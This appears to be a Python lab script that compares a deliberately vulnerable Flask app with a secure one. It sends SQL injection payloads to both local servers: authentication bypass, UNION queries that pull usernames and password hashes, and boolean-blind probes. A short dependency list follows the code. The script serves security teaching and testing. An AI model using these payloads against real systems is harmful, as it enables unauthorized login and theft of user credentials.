"""
SQL Injection Attack Testing Script
Tests both vulnerable and secure implementations
"""

import requests
import json

VULNERABLE_URL = "http://localhost:5001"
SECURE_URL = "http://localhost:5002"

def print_header(text):
    print("\n" + "=" * 70)
    print(f"  {text}")
    print("=" * 70)

def test_auth_bypass(base_url, version_name):
    """Test authentication bypass attacks"""
    print_header(f"Testing Auth Bypass on {version_name}")
    
    attacks = [
        {"username": "admin' OR '1'='1'--", "password": "anything"},
        {"username": "admin'--", "password": ""},
        {"username": "' OR 1=1--", "password": ""},
    ]
    
    for i, payload in enumerate(attacks, 1):
        print(f"\nAttack {i}: {payload['username']}")
        try:
            response = requests.post(
                f"{base_url}/api/login",
                json=payload,
                timeout=5
            )
            print(f"Status: {response.status_code}")
            print(f"Response: {json.dumps(response.json(), indent=2)}")
            
            if response.json().get('success'):
                print("🚨 VULNERABILITY CONFIRMED - Auth bypass successful!")
            else:
                print("✅ Attack blocked")
        except Exception as e:
            print(f"❌ Error: {e}")

def test_union_injection(base_url, version_name):
    """Test UNION-based SQL injection"""
    print_header(f"Testing UNION Injection on {version_name}")
    
    attacks = [
        "' UNION SELECT UserId, Username, Email FROM Users--",
        "' UNION SELECT 1, Username, PasswordHash FROM Users--",
    ]
    
    for i, payload in enumerate(attacks, 1):
        print(f"\nAttack {i}: {payload}")
        try:
            response = requests.get(
                f"{base_url}/api/posts/search",
                params={'q': payload},
                timeout=5
            )
            print(f"Status: {response.status_code}")
            result = response.json()
            
            if result.get('success') and len(result.get('posts', [])) > 0:
                print(f"🚨 Data extracted: {len(result['posts'])} records")
                print(f"Sample: {json.dumps(result['posts'][0], indent=2)}")
            else:
                print("✅ Attack blocked")
        except Exception as e:
            print(f"❌ Error: {e}")

def test_boolean_blind(base_url, version_name):
    """Test boolean-based blind SQL injection"""
    print_header(f"Testing Boolean Blind Injection on {version_name}")
    
    attacks = [
        ("' AND 1=1--", "True condition"),
        ("' AND 1=2--", "False condition"),
    ]
    
    for payload, description in attacks:
        print(f"\nAttack: {payload} ({description})")
        try:
            response = requests.get(
                f"{base_url}/api/posts/search",
                params={'q': payload},
                timeout=5
            )
            print(f"Status: {response.status_code}")
            result = response.json()
            print(f"Results: {len(result.get('posts', []))} posts")
            
            if result.get('success'):
                print("🚨 Query executed - boolean condition observable")
            else:
                print("✅ Attack blocked")
        except Exception as e:
            print(f"❌ Error: {e}")

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║        SQL Injection Testing Suite - Python Flask         ║
    ║                                                           ║
    ║  Make sure both servers are running:                      ║
    ║  - Vulnerable: python vulnerable_app.py (port 5001)       ║
    ║  - Secure: python secure_app.py (port 5002)              ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Test vulnerable version
    print("\n\n" + "█" * 70)
    print("█" + " " * 68 + "█")
    print("█" + " " * 20 + "VULNERABLE VERSION" + " " * 30 + "█")
    print("█" + " " * 68 + "█")
    print("█" * 70)
    
    test_auth_bypass(VULNERABLE_URL, "Vulnerable App")
    test_union_injection(VULNERABLE_URL, "Vulnerable App")
    test_boolean_blind(VULNERABLE_URL, "Vulnerable App")
    
    # Test secure version
    print("\n\n" + "█" * 70)
    print("█" + " " * 68 + "█")
    print("█" + " " * 23 + "SECURE VERSION" + " " * 31 + "█")
    print("█" + " " * 68 + "█")
    print("█" * 70)
    
    test_auth_bypass(SECURE_URL, "Secure App")
    test_union_injection(SECURE_URL, "Secure App")
    test_boolean_blind(SECURE_URL, "Secure App")
    
    print("\n\n" + "=" * 70)
    print("Testing Complete!")
    print("=" * 70)

if __name__ == '__main__':
    main()
Flask==3.0.0
pyodbc==5.0.1
SQLAlchemy==2.0.23

